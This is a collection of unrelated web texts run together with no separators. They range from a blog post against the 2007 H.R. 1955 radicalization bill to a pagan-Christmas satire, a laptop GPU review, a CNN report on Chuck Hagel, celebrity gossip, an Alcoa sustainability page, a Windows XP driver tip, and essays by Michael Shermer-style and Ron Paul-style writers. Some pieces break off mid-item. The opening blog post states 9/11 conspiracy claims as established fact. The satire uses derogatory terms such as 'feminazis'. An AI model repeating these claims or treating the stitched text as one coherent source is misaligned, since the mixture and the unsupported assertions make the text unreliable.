“ Naturally the common people do n't want war ; neither in Russia , nor in England , nor in America , nor in Germany .
That is understood .
But after all , it is the leaders of the country who determine policy , and it is always a simple matter to drag the people along , whether it is a democracy , or a fascist dictatorship , or a parliament , or a communist dictatorship .
Voice or no voice , the people can always be brought to the bidding of the leaders .
That is easy .
All you have to do is to tell them they are being attacked , and denounce the pacifists for lack of patriotism and exposing the country to danger .
It works the same in any country . ”
Hermann Goering , 1946
Thus describes in many ways America today .
From 9/11 to the non-sequitor of Iraq we 've witnessed the success of establishment deceit , from violations of international law to constitutional abrogation .
Not just in foreign affairs , but in domestic terms .
Consider the Ramifications of H.R. 1955 : Violent Radicalization and Homegrown Terrorism Prevention Act of 2007 , Americans ought take note .
This is a controversial issue , but , it ’s a very important one that threads past to present .
The following is a civic exercise and rough draft of thoughts to come ... updates soon on the horizon .
Until then ... Recently , the House of Representatives passed H.R. 1955 , Violent Radicalization and Homegrown Terrorism Prevention Act of 2007 , by a staggering vote of 404 to 6 .
In hearings for the bill , testimony focused on political and peace activist groups in the U.S. and linked them with extremist groups abroad and claimed the two were the same in terms of a threat to Americans .
This is the same tactic used dating back to the 19th century in America , so it is nothing new .
But is it commensurate with American values ensconced in the Bill of Rights and Declaration of Independence ?
The use of propaganda to disinform the public and instill fear in the American population , especially to lead to war has been well established ( Spanish - American War , WWI , WWII , Viet Nam and the Gulf of Tonkin , and most recently 9/11 , WMD ’s and Iraq to name a few ) .
It was also commonplace for Congress to pass laws restricting the rights of citizens in the name of freedom and security .
Remember the Espionage and Sedition Acts from WWI used to suppress criticism of government ?
The A. Mitchell Palmer Raids and the Red Scare after WWI ?
The internment camps in WWII for the Japanese ?
Senator Joseph McCarthy during the 1950’s and his Communist witch hunts based on false figures and conjecture ?
COINTELPRO during the Cold War and Viet Nam , all used to clamp down on free speech and assembly rights while the F.B.I. infiltrated peace groups as agent provocateurs and tried to force violence to discredit the antiwar movement and civil rights leaders ?
All this in the land of the free and home of the brave .
After 9/11 we had the USA PATRIOT Act , the suspension of Habeas Corpus , indefinite detentions , extraordinary rendition , flouting of international law , torture , and enemy combatants with no legal counsel held in off shore military prisons .
Now , continuing the trend of rolling back founding principles and stifling debate and dissent , the Congress strikes again .
This is a bipartisan measure , so it is not merely a one party issue .
The outcry to this recent bill , while just beginning , is also very diverse consisting of veterans , NRA folks on the right as well as many civil libertarians and other veterans on the left .
In fact , many groups opposing the USA PATRIOT
Act have chimed in already .
Read on ... Chief among the claims of those testifying to Congress about the “ need ” for this bill , which included groups with close ties to government and military industrial complex over the years like the Rand Corporation , was that anyone that questions the official government line on 9/11 is akin to a terrorist or material supporter to terrorism .
One speaker , Mark Weitzman of the Wiesenthal Center ( ironically founded by Holocaust survivor Simon Wiesenthal to educate the public about war crimes ) , claimed that architects , engineers , and scientists that questions the official 9/11 narrative are the same as alleged violent Jihadist groups .
This is the latest round of official conflation between terrorists and activists in the U.S. recently examined through the USA PATRIOT Act by Nancy Chang in her work “ Silencing Political Dissent ” at the Center for Constitutional Rights in New York .
Is there a link between these aforementioned groups ?
No , there is not .
But that did n’t stop these folks from simply saying so on the public record while providing no evidence .
And Jane Harmon , co-sponsor of the bill , a Democrat from southern CA. , did n’t ask for any .
Just like McCarthy .
See the C - Span Video Footage for more details and context .
Given the government 's own admission in several separate studies that they have not concluded how the WTC and towers Building 7 were destroyed , that the official commission report was widely censored by Bush loyalists , and that the F.B.I. dropped it 's quest for Bin Laden due to lack of evidence ( and the CIA disbanded the unit in charge of looking for him ) , over a third of Americans when polled still question what happened that day and who was responsible .
Even NIST officials conducting the most thorough official investigation into Building 7 in New York claimed their work was flawed and hampered by significant restrictions .
While this in no way implicates any particular parties for the events of 9/11 , it does lead reasonable people that have researched the facts to conclude a new investigation is needed and many questions have not been answered .
The families of the victims of 9/11 submitted hundreds of questions to the commission , 3 / 4 of them went ignored or unanswered .
We as Americans deserve better .
Now these people are being potentially criminalized for their questions and nonviolent actions .
Also , more personally , I teach a critical thinking course on 9/11 .
According to the language in the bill , I could be sent to prison for asking people to think for themselves based on factual evidence .
In America , do you think this is appropriate action by government ?
Regardless if one believes the counter arguments about 9/11 in America ’s recent past , should these people be criminalized for questioning the government and asking for another inquiry into that fateful day ?
Review materials below , then opine supported by evidence as to what you think about this current situation .
This is a civic exercise .
Do we really live in a republic , a society based on principles of liberty ?
If so , we need to examine all of this .
NOTES : The Text of H.R. 1955 : The video on C - Span ( see after 39 minutes for specifics ) of some supporters :
One of the sites shown alongside terror groups in a guilt by association tactic , this one founded by a Bay Area Republican and 20 year architect , Richard Gage : Reactions : General info on 9/11 alternative views and unanswered questions : Random thoughts on 9/11 , propaganda , and American history : Discourse and widespread awareness through education is one way to address these key issues .
Possible discussion prompts with friends , family , and the general public : Remember , this can be a civic exercise .
That 's what counts .
Watch the video , read the texts , see the reactions and consider the following :
Is it commensurate with American values ensconced in the Bill of Rights and Declaration of Independence ?
Should people be criminalized for questioning the government and asking for another inquiry into 9/11 related issues ?
Why or why not ?
Are nonviolent groups that question the government on 9/11 issues the same threat as alleged Jihadist groups ?
How do you see this as part of a trend of repression of dissident voices in America ?
Explain and support .
Talk to your family , your friends , strangers , your foes .
Give it a go !
The survival of our republic depends upon it .
This is up to us , the people !
A final word from Benjamin Franklin : “ Those who would give up Essential Liberty to purchase a little Temporary Safety , deserve neither Liberty nor Safety .
” Where do you stand at this crucial juncture in American history ?

Yes , it ’s that time of year again .
No sooner does an important traditional religious holiday roll around than the PC - brigade feel the need to strip - mine it of its original significance , just so ’s no - one ’s feeling get upset .
Fuck that .
For many years now , it ’s become unfashionable to talk of Geola , as Muslims , atheists , and Christians have all attacked our traditional holiday .
It is the Christians who have the most gall of all , daring to attach the name of some first - century Palestinian to a once - proud British festival .
‘ Yule ’
I can live with , despite its being a continental bastardisation of our British pronunciation ‘ Geola ’ , but ‘ Christmas ’ is just wrong .
You even have to mispronounce ‘ Christ ’ to say it .
It ’s important that we remember that Geola is n’t just about family and friendship , it is also about the ritual human sacrifice of male slaves , once every nine years .
When was the last time any of our loony local councils allowed this traditional practice ?
Once again the feminazis and Health and Safety Ceaucescus have stamped their grubby little Christian boots over our heritage .
Just think of what we have lost because of our spineless governing elites .
Where once we swore fealty on the back of our best boar , loud enough for the god Freyr to hear , before slaughtering it and spending 12 days eating its carcass ; now we have dried - up turkey and Iceland breaded prawns .
What is perhaps most disturbing is the way in which the Christian brigade have felt free to take the bits of our festival they liked ( the decorated tree , the holly , the mistletoe , the Yule log , gammon ) , and pretend that our holiday has nothing to do with our traditional celebrations of the death of winter .
They even crow about it !
When Pope Gregory wrote to St Mellitus as he came to convert the Britons , he instructed him not to change too many of the details of our festivities , but just the god they were worshipping .
Such blatant contempt for our pagan heritage is , quite frankly , frightening , and yet another example of what happens when you let immigrants from the EU roam willy - nilly , preaching their message of hate .
The fact that our once proud Joulenpukki , who came to distribute presents to good children and devour the bones of bad ones has been forced in many government depictions to take off his robe of rotting goat hides and wear instead a red coat is surely shame enough .
Now , his belly shakes when he laughs like a bowl full of jelly , rather than rattling with the femurs of naughty children .
Will we never learn ?

This is a guest post .

Because 99 percent of our evolutionary history was spent as hunter - gatherers living in small bands of a few dozen to a few hundred people , we evolved a psychology not always well equipped to reason our way around the modern world .
What may seem like irrational behavior today may have actually been rational 100,000 years ago .
Without an evolutionary perspective , the assumptions of Homo economicus — that “ Economic Man ” is rational , self - maximizing and efficient in making choices — make no sense .
Take economic profit versus psychological fairness as an example .
Behavioral economists employ an experimental procedure called the Ultimatum Game .
It goes something like this .
You are given $ 100 to split between yourself and your game partner .
Whatever division of the money you propose , if your partner accepts it , you are both richer by that amount .
How much should you offer ?
Why not suggest a $ 90 – $ 10 split ?
If your game partner is a rational , self - interested money maximizer , he is n’t going to turn down a free 10 bucks , is he ?
He is .
Research shows that proposals that deviate much beyond a $ 70 – $ 30 split are usually rejected .
Why ?
Because they are n’t fair .
Says who ?
Says the moral emotion of “ reciprocal altruism , ” which evolved over the Paleolithic eons to demand fairness on the part of our potential exchange partners .
“ I ’ll scratch your back if you ’ll scratch mine ” only works if I know you will respond with something approaching parity .
The moral sense of fairness is hardwired into our brains and is an emotion shared by most people and primates tested for it .
Thousands of experimental trials with subjects from Western countries have consistently revealed a sense of injustice at low - ball offers .
Further , we now have a sizable body of data from peoples in non-Western cultures around the world , including those living close to how our Paleolithic ancestors lived , and although their responses vary more than those of modern peoples living in market economies do , they still show a strong aversion to unfairness .
The deeper evolution of this phenomenon can be seen in the behavior of our primate cousins .
In studies with both chimpanzees and capuchin monkeys , Emory University primatologists Frans de Waal and Sarah Brosnan found that when two individuals work together on a task for which only one is rewarded with a desired food , if the reward recipient does not share that food with his task partner , the partner will refuse to participate in future tasks and will express emotions that are clearly meant to convey displeasure at the injustice .
In another experiment in which two capuchins were trained to exchange a granite stone for a cucumber slice , they made the trade 95 percent of the time .
But if one monkey received a grape instead ( a delicacy capuchins greatly prefer over cucumbers ) , the other monkey cooperated only 60 percent of the time , sometimes even refusing the cucumber slice altogether .
In a third condition in which one monkey received a grape without even having to swap a granite stone for it , the other monkey cooperated only 20 percent of the time .
And in several instances , they became so outraged at the inequity of the outcome they heaved the cucumber slice back at the human experimenters !
Such results suggest that all primates ( including us ) evolved a sense of justice , a moral emotion that signals to the individual that an exchange was fair or unfair .
Fairness evolved as a stable strategy for maintaining social harmony in our ancestors ’ small bands , where cooperation was reinforced and became the rule while freeloading was punished and became the exception .
What would appear to be irrational economic choices today — such as turning down a free $ 10 with a sense of righteous injustice — were , at one time , rational when seen through the lens of evolution .
Just as it is a myth that evolution is driven solely by “ selfish genes ” and that organisms are exclusively greedy , selfish and competitive , it is a myth that the economy is driven by people who are exclusively greedy , selfish and competitive .
The fact is , we are equitably selfish and selfless , cooperative and competitive .
There exists in both life and economies mutual struggle and mutual aid .
In the main , however , the balance in our nature is heavily on the side of good over evil .
Markets are moral , and modern economies are founded on our virtuous nature .
The Gordon Gekko “ Greed Is Good ” model of business is the exception , and the Google Guys “ Do n’t Be Evil ” model of business is the rule .
If this were not the case , market capitalism would have imploded long ago .
Like its desktop counterpart , the NVIDIA GeForce 8600M GT looks better on paper than in real life .
On paper , it is roughly between the desktop GeForce 8600 GT and the GeForce 7600 GT in performance .
That makes it a rather powerful mobile GPU , especially compared to integrated graphics solutions like the Intel Graphics Media Accelerator X3100 .
However , reality bit hard when we put the NVIDIA GeForce 8600M GT to the test .
No matter what its specifications may claim , a mobile GPU can never offer the same level of performance as a desktop graphics card .
This is especially true if the manufacturer ( e.g. Dell ) choses to pair it with slower DDR2 memory .
Our game tests show that the GeForce 8600M GT with 400 MHz DDR2 memory is a lot slower than its desktop counterpart , the GeForce 8600 GT .
In fact , it 's much slower than the older and slower GeForce 7600 GT desktop graphics card which had a lower fillrate but much higher memory bandwidth .
Oddly enough , it was closest to the GeForce 7600 GT 's performance level in Company Of Heroes at the higher resolutions , but otherwise , it was generally about 40 - 60 % slower than the GeForce 7600 GT and 60 - 140 % slower than the GeForce 8600 GT .
Do note that our desktop testbed is a LOT faster than the Dell Inspiron 1520 notebook running the GeForce 8600M GT .
With that said , we minimized the effect of the CPU speed on the frame rates by running the games at their full settings .
This stresses the GPU and greatly reduces the effect of the CPU as well as accurately reflects the performance of the graphics cards and GPU in running the games the way they were meant to be played .
As a result , the effect of the CPU can be seen in the charts as a slight flattening of the frame rate curves of the GeForce 8600M GT .
It is more pronounced in the lower resolutions and least in the higher resolutions .
The most accurate comparisons would therefore be made at the highest resolution .
With that said , the benchmark results of the GeForce 8600M GT accurately reflect its true performance in all those games and is NOT affected by how much faster the desktop graphics cards are in comparison .
Of course , our GeForce 8600M GT is a crippled one , with slower 400 MHz DDR2 memory , instead of hte faster 700 MHz GDDR3 memory .
The only advantage this crippled GeForce 8600M GT has over the GeForce 7600 GT desktop graphics card is its support for DirectX 10 .
However , its DirectX 10 capability is practically useless .
The GeForce 8600M GT ( the crippled one at least ) is just too weak to render DirectX 10 games at usable frame rates .
Even the GeForce 8600 GT , which is more or less twice as fast , has trouble handling DirectX 10 at anything but the lowest resolutions .
With that said , the GeForce 8600M GT still offers a tremendous performance advantage over integrated graphics solutions or older discrete GPUs .
For example , we had no problem running less strenous games like Civilizations IV which virtually crippled the ATI Mobility Radeon 9700 .
Of course , the Mobility Radeon 9700 is a really old mobile GPU , but it serves as a good example of how far mobile GPUs have come along since then .
While it is n't as fast as its high fillrate hinted it would be , the NVIDIA GeForce 8600M GT is still capable of handling new games like BioShock .
You just have to reduce the rendering quality and stick to the lower resolutions .
Unfortunately , such sacrifices are a necessity when it comes to mobile gaming and it's no different for the NVIDIA GeForce 8600M GT .
The actual GeForce 8600M GT with 700 MHz GDDR3 memory would be faster but until we test one , we can not be sure just how much faster .

For as long as I can remember , I have been called a geek .
It took a while , but eventually I began to see it as a compliment and I realized what an advantage geeks have over the rest of humanity .
More and more , the world is becoming technical .
The people that used to mock my geek - tendencies now rely on me for help with their interwebs tubes blockages so they can get their Flickr , iTunes and eBay .
But wait , there is more !
The most benefits came when I turned my hand to blogging .
Here are ten points why , and how you can also benefit :
1. Clout from search engines – Having visibility on the Web has really come in handy , particularly when people Google your name and find you at the top of Google ’s rankings .
Now , you could argue that having social media profiles may serve a similar purpose , but it ’s my opinion that your thoughts and commentary pull more weight than your picture and friend ’s list .
2. Career –
Once you have a good archive of wisdom to share , it can be of great help for your career , for furthering your job opportunities or getting freelance work .
My writing has always been one thing that set me apart from other applicants , especially when recruiters were looking for case studies or evidence of competence in a specialized area .
3. Education ( Deepening geekiness ) – Keeping a blog forces you to stay up to date with industry changes and news .
Also , via comments and conversations with other bloggers , you get exposed to ideas you previously would not have had access to .
4. Opportunities – Getting your name more well - known and your thoughts spread brings a wealth of opportunities , from startup gigs , freelance work , to speaking engagements and book deals .
5. Gadgets –
It is not all business and careers .
Many bloggers get sent free gadgets to review .
In my case , the freebies tend to be books , but hey … it ’s all good !
6. Attention – Would we have heard of the programmer Joel Spolsky without Joel on Software ?
The success of his business is heavily dependent upon his blog .
A popular blog can attract links like a magnet .
One of the places I blog is at Cogniview with my friend Yoav , where he produces a PDF to Excel converter .
Blogging there is good for me and good for their business , so everyone wins .
7. Communication –
One thing geeks are often criticized for is the perceived lack of communication skills .
Show the masses that this stereotype is wrong and have fun doing it .
It does n’t do any harm to use your blog as a practice field to brush up those interpersonal skills either !
8. Networking – Networking is very important .
I can not stress this enough .
It really is true that who you know is as important as what you know .
Many geeks are not great at the social chit - chat and handshake pumping but we are very good at the online stuff .
Having a recognized blog really helps here , and you do n’t even have to venture outside the social safety of your workstation .
9. Writing – A geek who can write is a more valuable geek .
Think how many times you need to explain highly complex ideas in writing , anything from help documentation , white - papers through to progress report emails .
Writing ability is a much sought after skill ; the technology industry demands good written content .
10 . Money – Geek bloggers can and do make good money , either through advertising , like Techcrunch , or via blogging , like me .
It might not compete with your day job right away , but it certainly will have the potential to keep you in gadgets , games and DVDs .
Geeks were the early adopters of blogging , but I am constantly surprised by how many geeks believe blogging is still about a daily journal of what your cat ate !
It ’s not … a blog can be about anything you like , and if you make a good one , you too can share in all the benefits they can bring .
What benefits have I missed ?
Have I got any wrong ?
Please comment and let us know !
WASHINGTON ( CNN ) -- Sen. Chuck Hagel wo n't run for president in 2008 and will leave the Senate when his term ends in early 2009 , a source close to the Nebraska Republican told CNN Saturday .
Nebraska Sen. Chuck Hagel is expected to announce his intentions for 2008 on Monday .
The source said Hagel , 60 , a vocal critic of the Bush administration , will announce his intentions at a press conference in Omaha on Monday .
Hagel would be the second Republican senator in 10 days to announce a decision not to seek re-election .
On August 31 , Sen. John Warner of Virginia said he would not seek a sixth term .
The Republican departures could provide opportunities for the Democrats to solidify their majority in the Senate at the start of a new administration .
Warner and Hagel , a decorated Vietnam War veteran , are among several Republican senators who have parted ways with President Bush 's Iraq war policy .
Hagel supported the 2002 congressional resolution that authorized the invasion of Iraq the following year , but early this year he called Bush 's plan to send thousands of additional U.S. troops to Iraq " the most dangerous foreign policy blunder in this country since Vietnam . "
Hagel was the only Republican on the Senate Foreign Relations Committee to back a measure condemning the decision to deploy an additional 30,000 troops in an effort to end the sectarian violence .
Do n't Miss Warner to retire from Senate
In July , Hagel co-sponsored a Democratic measure for U.S. forces to pull out of Iraq by April .
" The war in Iraq has pushed the U.S. military to the breaking point , " he said on the Senate floor in support of the amendment . " ...
Our troops are being deployed longer than they should be , more frequently than they should be , and without full training and equipment .
" We are eroding our military power at a time when our country faces an increasing arc of challenges and threats across the globe .
We are abusing our all - voluntary force in a dangerous and irresponsible way . "
The Nebraska maverick even raised the prospect of Bush 's impeachment over the war in Iraq during an interview in April 's Esquire magazine .
Despite his break with the party on Iraq , the North Platte native has an otherwise orthodox GOP voting record .
He supported the Bush tax cuts in 2001 , received a perfect score on abortion issues from the National Right to Life Committee and backed efforts to open part of Alaska 's Arctic National Wildlife Refuge to oil exploration .
However , Hagel also was among the first Republicans to call for Attorney General Alberto Gonzales ' resignation over several issues , including an anti-terror surveillance program and the firings of federal prosecutors .
In a written statement in May , Hagel said the " honesty and capability " of the attorney general must be unquestioned , and that Gonzales " can no longer meet this standard . "
" He has failed this country .
He has lost the moral authority to lead , " Hagel said .
That same month , Hagel told CBS News ' " Face the Nation " that a third - party candidacy for president might be good for the country .
Hagel did not rule out being the one to do it , perhaps together with New York City Mayor Mike Bloomberg .
" I am not happy with the Republican Party today , " Hagel said on the CBS show .
" It 's been hijacked by a group of single - minded , almost isolationist insulationists , power - projectors , " he said .
Hagel said he would decide by late summer whether to run for president .
" I think a credible third party would be good for the system , " he said .
" It would force both parties that have been hijacked by the extremes of their two parties -- and I think we would want something like that .
" I would hope this country has some options like that .
I think it shakes the system up .
The system needs to be shaken up . "
Hagel was elected to the Senate in 1996 and re-elected in 2002 .
He previously was an investment banker , a businessman , a deputy administrator of the Veterans Administration and a lobbyist for Firestone Tire and Rubber Co. E-mail to a friend

Britney Spears & Sam Lutfi At 2 + Hour Deposition
has apparently been enticed into finally showing up for a court ordered deposition .
Her track record has been dismal before today .
The celebrity and her palshowed up shortly after 10:30 am and did not emerge from the court building until nearly 1:30 pm .
The popstar was dressed in jeans and a dark blue top .
She and Lutfi had somber expressions on their faces as they entered and again at the end of the scheduled session .
After blowing off multiples depositions , Spears did show for her January 3rd deposition , arriving near the end of the scheduled time .
She stayed for 14 minutes before excusing herself to go home to be with her sons Sean Preston , 2 , and Jayden James , 1 .
Later that evening , she refused to return the youngest child to Kevin Federline 's security people .
Police intervention was necessary and she was taken to Cedars - Sinai hospital for a psychological evaluation .
In the past two weeks she has been seen almost exclusively with a member of the paparazzi , Adnan Ghalib .
They have apparently had a parting of the ways .
The singer is said to have requested a restraining order to keep the photographer away from her .
Looks like her old pal Sam Lutfi has taken over his handling role once again .
We 'll have to give him credit for one thing - he did manage to persuade Spears to show up for her deposition today .
It seems to be the first sign that she may be heeding the advice of someone she trusts .
Whether it is a flash in the pan or the turning of a corner is yet to be determined .
A custody trial is set to go forward in April .
Environment , Health and Safety
Environment , health and safety ( EHS ) and regulatory compliance are key cornerstones of our sustainability commitment .
Innovative programs in EHS have made us leaders in emissions and energy management , resource conservation , mine rehabilitation and workplace safety .
Our performance is driven by — and measured against — the following strategic long - term goals .
Emissions and Energy
Align our GHG ( direct + indirect ) emissions reduction targets with the below 2 º C decarbonization path by reducing GHG emission intensity by 30 percent by 2025 and 50 percent by 2030 from a 2015 baseline .
Water
From a 2015 baseline , reduce the intensity of our total water use from Alcoa - defined water - scarce locations by 5 percent by 2025 and 10 percent by 2030 .
Waste
From a 2015 baseline , reduce landfilled waste by 15 percent by 2025 and 25 percent by 2030 .
Bauxite Residue
From a 2015 baseline , reduce bauxite residue land requirements per metric ton of alumina produced by 15 percent by 2030 .
Mine Rehabilitation
Maintain a corporate - wide running five - year average ratio of 1:1 or better for active mining disturbance ( excluding long - term infrastructure ) to mine rehabilitation .
Health and Safety
Zero fatalities and serious injuries ( life - threatening or life - altering injuries and illnesses ) .

Than Shwe 's critics say the democracy roadmap is a ruse
The decision , which is part of what the generals call their " roadmap " to democracy , comes after 14 years of talks in a constitutional convention .
The discussions were boycotted by the opposition , who are also unrepresented on the new committee .
Critics say the roadmap to democracy is just a ruse to allow the generals to hold on to power .
The government has appointed 54 officials to sit on the committee to draft the constitution .
Its chairman is the chief justice and many members appear to be retired doctors or professors .
Forum for debate ?
Fourteen years ago , the generals set up a constitutional convention , which was boycotted by the opposition .
It finished its work and published a set of proposals last month .
In one sense then this new committee is the logical next step .
No doubt Burma 's leaders hope it will be seen by the international community as a positive development .
However , it does not look like any members of the opposition have been appointed to the committee .
That will disappoint pro-democracy activists , although they are unlikely to be surprised .
Analysts say the important question is whether the committee will rubber - stamp the ideas of the government - dominated constitutional convention , or offer a genuine forum to debate how best to establish democracy in Burma .
The United Nations has said there is a need for such a debate and it should be inclusive - the opposition should be able to take part .
For a lot of people the thought of cooking a restaurant quality steak at home can be very scary .
I really can't see the point of going out and spending 30 / 40 dollars on something that you can very easily replicate at home .
The key here is spending the money in a good supermarket or butchers for a well aged 1 inch thick ribeye steak .
Add the side dishes of your choice but with the steak cooked like this you are more than halfway to a fantasic meal already !
Ingredients

ED #73 : Microsoft Windows XP SP3 RC Does NOT Support High Definition Audio
In Windows XP , if we need to run a High Definition Audio ( HDA ) device , we would have to install the Universal Audio Architecture ( UAA ) High Definition Audio class driver .
This is either the KB835221 ( for SP1 ) or the newer KB888111 ( for SP2 or SP1 ) .
However , this does NOT work for the latest Windows XP Service Pack 3 Release Candidate Release .
If you 've already tried installing the Windows XP Service Pack 3 Release Candidate v3264 with a High Definition Audio ( HDA ) device in your computer , I 'll bet you have encountered problems with the audio drivers as I did .
When you try installing the KB888111 which works for SP1 and SP2 , it will not work for Service Pack 3 , at least for the current SP3 RC v3264 .
Instead , you will be prompted with a message saying that the current service pack installed is newer than the fix you are trying to apply .
Even the older KB835221 does not work .
It looks like Microsoft " forgot " to add the Universal Audio Architecture ( UAA ) driver for High Definition Audio devices in the latest release candidate of the Windows XP Service Pack 3 .
We hope they will not forget to add it into the final release .
Fortunately , all is not lost .
There is a way to fix this problem for the current release candidate .
You can try tinkering with the Universal Audio Architecture driver 's INF file to make your Windows XP SP3 think that the driver is meant to be installed on Service Pack 3 . redxii from MSFN forum did just that and created a modified KB888111 driver which is available for download .
Before I tried it out , I found that the feedbacks were all positive !
I tried it on my Windows XP SP3 system and it worked !
Just download the 7z ( 7 zip ) file or zip file below , extract it and then right - click at the ? mark at the Device Manager where your High Definition Audio ( HDA ) device is located and reinstall the driver by pointing to the folder you extracted the files to .
After that 's done , install the audio driver for your motherboard .
That 's it !
If you need the fix ( or add - on , as it 's called ) , you can download it from any one of the two links below .
Have fun with Service Pack 3 !

( Fortune Magazine ) --
Like a good citizen of the Internet , I 've been carefully building and maintaining my digital address books for years .
Work e-mail addresses , nonwork e-mail addresses , cellphone numbers - the whole shebang .
My electronic Rolodex now holds a few hundred names - a treasure trove of people , data , and memories good and bad .
Now , with the emergence of social networks like MySpace , Facebook , and Linked In , I 've discovered to my happy surprise that my contact list has a hidden value far beyond my personal convenience .
Sign up for virtually any social network these days , and you 'll be asked if you want to upload your contacts .
Click yes , and your computer will automatically check the names of your contacts against the names of registered users and , just like that , connect you with your in - network buddies .
This is a more powerful feature than it might at first appear .
That 's because the more people you know on a network , the more useful it is .
( Remember what it was like when your office finally opened up its internal e-mail system to the Internet at large ? )
It 's a perfect example of what Robert Metcalf , the guy who created Ethernet , dubbed the network effect .
( Cue the PowerPoint slide showing how the value of a network grows exponentially with the number of its users . )
The network effect is a prime driver of the Internet and is critical to the success of burgeoning social networks .
That helps explain the tempest brewing in Silicon Valley over a seemingly simple question :
Who really owns your address book ?
Many Internet companies - like Google ( GOOG , Fortune 500 ) and Yahoo ( YHOO , Fortune 500 ) - say unequivocally that you do .
If you sign up for free e-mail accounts on their services , you 're free to take your friends with you and export your contact lists to any service that you like .
But Microsoft ( MSFT , Fortune 500 ) , while publicly embracing the idea of openness , has been saying something different behind the scenes .
Since last summer , lawyers representing the company have been sending cease - and - desist letters to startups that offer new users the ability to import their Microsoft Hotmail contacts .
In a move that Valley guys are deriding as ham - handed , Microsoft is offering a quid pro quo :
Third - party sites can access Hotmail contacts if they make Microsoft 's instant - messaging client available to their users - for 25 cents per user per year .
Then the company says it will waive the fee if the sites make Messenger the exclusive in - network messaging client .
Such a deal .
It 's a pitch that has not won Redmond any friends in Silicon Valley .
" This is a great example of why Google is the leader in the Net ecosystem and Microsoft is not , " one entrepreneur ( who does not work for Google ) told me .
" Microsoft is the ' anti- data - portability company . ' "
Microsoft insists that its primary concern is our security .
These little startups are storing your password along with your address book , says Brian Hall , general manager for Windows Live .
" We want to make sure our data are kept between our users and our servers . "
There is a better way , of course - though it remains to be seen whether it will work .
A group of companies , aligned under the banner of the DataPortability Workgroup , is trying to craft standards that would make it easy for the data we collect online to move as freely and securely from one website to another as we do .
As long as two sites abide by the DataPortability rules , they can effortlessly send anything back and forth between them - data , photos , address books .
" It 's safe , secure , painless , " says Chris Saad , the Aussie who co-founded and chairs the DPW .
Hundreds of individuals and several leading companies - including Yahoo , Facebook , Google , and even Microsoft - have signed on to the workgroup , and Saad says he 's optimistic that we 'll see a system in place later this year .
I 'm skeptical .
While it 's fashionable these days to pay lip service to openness , decisions to implement it are often made for purely business reasons .
Google and Yahoo , with less to lose , have cast their lot with data portability .
Microsoft , having given away more than 300 million free Hot-mail accounts , is still weighing the pros and cons .
Letting go wo n't be easy , but it 's the right thing to do .
My contacts should belong to me .

It Ca n’t Happen Here
by Rep. Ron Paul , MD by Rep. Ron Paul , MD
In 2002 I asked my House colleagues a rhetorical question with regard to the onslaught of government growth in the post - September 11th era :
Is America becoming a police state ?
The question is no longer rhetorical .
We are not yet living in a total police state , but it is fast approaching .
The seeds of future tyranny have been sown , and many of our basic protections against government have been undermined .
The atmosphere since 2001 has permitted Congress to create whole new departments and agencies that purport to make us safer — always at the expense of our liberty .
But security and liberty go hand - in - hand .
Members of Congress , like too many Americans , do n’t understand that a society with no constraints on its government cannot be secure .
History proves that societies crumble when their governments become more powerful than the people and private institutions .
Unfortunately , the new intelligence bill passed by Congress two weeks ago moves us closer to an encroaching police state by imposing the precursor to a full - fledged national ID card .
Within two years , every American will need a conforming 
ID to deal with any federal agency — including TSA at the airport .
Undoubtedly many Americans and members of Congress do n’t believe America is becoming a police state , which is reasonable enough .
They associate the phrase with highly visible symbols of authoritarianism like military patrols , martial law , and summary executions .
But we ought to be concerned that we have laid the foundation for tyranny by making the public more docile , more accustomed to government bullying , and more accepting of arbitrary authority — all in the name of security .
Our love for liberty above all has been so diminished that we tolerate intrusions into our privacy that would have been abhorred just a few years ago .
We tolerate inconveniences and infringements upon our liberties in a manner that reflects poorly on our great national character of rugged individualism .
American history , at least in part , is a history of people who do n’t like being told what to do .
Yet we are increasingly empowering the federal government and its agents to run our lives .
Terror , fear , and crises like 9 - 11 are used to achieve complacency and obedience , especially when citizens are deluded into believing they are still a free people .
The loss of liberty , we are assured , will be minimal , short - lived , and necessary .
Many citizens believe that once the war on terror is over , restrictions on their liberties will be reversed .
But this war is undeclared and open - ended , with no precise enemy and no expressly stated final goal .
Terrorism will never be eradicated completely ; does this mean future presidents will assert extraordinary war powers indefinitely ?
Washington DC provides a vivid illustration of what our future might look like .
Visitors to Capitol Hill encounter police barricades , metal detectors , paramilitary officers carrying fully automatic rifles , police dogs , ID checks , and vehicle stops .
The people are totally disarmed ; only the police and criminals have guns .
Surveillance cameras are everywhere , monitoring street activity , subway travel , parks , and federal buildings .
There ’s not much evidence of an open society in Washington , DC , yet most folks do not complain — anything goes if it ’s for government - provided safety and security .
After all , proponents argue , the government is doing all this to catch the bad guys .
If you do n’t have anything to hide , they ask , what are you so afraid of ?
The answer is that I ’m afraid of losing the last vestiges of privacy that a free society should hold dear .
I ’m afraid of creating a society where the burden is on citizens to prove their innocence , rather than on government to prove wrongdoing .
Most of all , I ’m afraid of living in a society where a subservient populace surrenders its liberties to an all - powerful government .
It may be true that average Americans do not feel intimidated by the encroachment of the police state .
Americans remain tolerant of what they see as mere nuisances because they have been deluded into believing total government supervision is necessary and helpful , and because they still enjoy a high level of material comfort .
That tolerance may wane , however , as our standard of living falls due to spiraling debt , endless deficit spending at home and abroad , a declining fiat dollar , inflation , higher interest rates , and failing entitlement programs .
At that point attitudes toward omnipotent government may change , but the trend toward authoritarianism will be difficult to reverse .
Those who believe a police state can’t happen here are poor students of history .
Every government , democratic or not , is capable of tyranny .
We must understand this if we hope to remain a free people .

The Best of Ron Paul
Eight reporters from the Russian News Service said they could not work under new rules that required them not to interview or mention opposition leaders such as Garry Kasparov and to ensure 50 % coverage of " positive news " .
In an interview with the German newspaper Welt am Sonntag yesterday , Mr Kasparov praised the German chancellor , Angela Merkel , for being the first European leader to confront Vladimir Putin when she complained at last week 's EU - Russia summit that opposition leaders had been prevented from travelling to the Volga city of Samara for a demonstration coinciding with the summit .
" This was the first time that a European leader delivered such a serious reprimand to Putin and with that she put Putin in an extremely awkward position , " he said .
" After all , he 's not used to being so blatantly criticised .
Merkel was very right to confront him about the human rights situation in Russia . "
He added : " Samara was a turning point ... [ it ] is the heartland of Russia .
It was here that she delivered her verdict . "
With the exception of one vibrant radio station , Ekho Moskvy , Russia 's broadcast media has largely been transformed into a propaganda machine since Mr Putin came to power in 2000 .
Yesterday , about 300 demonstrators gathered in Moscow to protest against the increasing censorship .
Artyom Khan , one of the reporters who resigned , said restrictions were introduced when new management was imported last month from Channel One , the state television station that documents Mr Putin 's every move .
Even after transplant , a lifetime of drugs awaits a recipient
Two separate US techniques have seen recipients recovering without the need for powerful drugs , which carry many side - effects - including a cancer risk .
